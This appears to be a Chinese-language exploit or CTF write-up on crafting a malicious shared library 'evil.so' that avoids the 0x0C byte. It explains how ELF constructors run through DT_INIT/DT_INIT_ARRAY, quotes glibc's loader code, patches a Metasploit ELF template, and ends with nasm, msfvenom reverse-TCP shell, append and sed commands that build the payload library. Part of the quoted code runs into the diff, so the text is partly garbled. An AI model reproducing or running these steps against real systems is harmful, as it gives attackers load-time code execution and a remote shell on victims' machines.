没有0x0C的evil.so
为什么constructor 会在库加载的时候执行
static void before_main(void) __attribute__((constructor));
像这种具有constructor属性的函数会在初始化时执行，主要是通过.init / .init_array 实现(还有.fini_array
类似析构), 不同的平台/版本编译链接时处理不同，详见宋教授的文章 .init, .ctors, and .init_array
落到文件内容层面，ELF的Section中有一个类型为SHT_DYNAMIC (6) 的Section， 其存储着动态链接信
息，一般情况下name为 .dynamic
其中dynamic entries里的DT_INIT项存着一个偏移，在加载时会与 l->l_addr 也就是elf的加载基址相加并
跳去执行。 而DT_INIT_ARRAY则是当作reloc后的地址(也就是没有加基址的操作)，直接跳转。
in https://github.com/bminor/glibc/blob/glibc-2.34/elf/dl-init.c 55-72
  if (ELF_INITFINI && l->l_info[DT_INIT] != NULL)
    DL_CALL_DT_INIT(l, l->l_addr + l->l_info[DT_INIT]->d_un.d_ptr, argc, argv, env);
  /* Next see whether there is an array with initialization functions.  */
  ElfW(Dyn) *init_array = l->l_info[DT_INIT_ARRAY];
  if (init_array != NULL)
    {
      unsigned int j;
      unsigned int jm;
      ElfW(Addr) *addrs;
      jm = l->l_info[DT_INIT_ARRAYSZ]->d_un.d_val / sizeof (ElfW(Addr));
      addrs = (ElfW(Addr) *) (init_array->d_un.d_ptr + l->l_addr);
      for (j = 0; j  ; DT_INIT_ARRAY
>   dq    0x19
>   dq    r5
> ; DT_INIT_ARRAYSZ
>   dq    0x1B
>   dq  0x8
70a74
> r5:
87,88c91,92
  db 0x90
>  db 0x90
nasm elf_dll_x64_template_init_array.s -f bin -o modified.so
msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "x09\x0c\x20="  
-f raw -o raw.bin
cat raw.bin >> modified.so
ls -al ./modified.so
sed  's/\xEF\xBE\xAD\xDE/\xec\x01\x00\x00/g' ./modified.so > final.so # file size